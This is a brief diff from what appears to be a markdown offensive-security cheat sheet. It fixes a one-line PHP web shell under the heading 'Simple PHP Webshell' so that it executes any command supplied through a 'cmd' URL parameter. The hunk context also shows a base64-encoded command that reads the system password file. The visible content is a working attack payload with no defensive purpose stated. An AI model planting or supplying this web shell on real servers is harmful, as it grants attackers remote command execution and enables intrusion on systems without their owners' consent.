@@ -347,7 +347,7 @@ Y2F0IC9ldGMvcGFzc3dkCg==
 
 Simple PHP Webshell
 ```
-<pre><?php+passthru(\$_GET['cmd']);?></pre>
+<pre><?php passthru(\$_GET['cmd']);?></pre>
 ```
 
 From the larger example of 
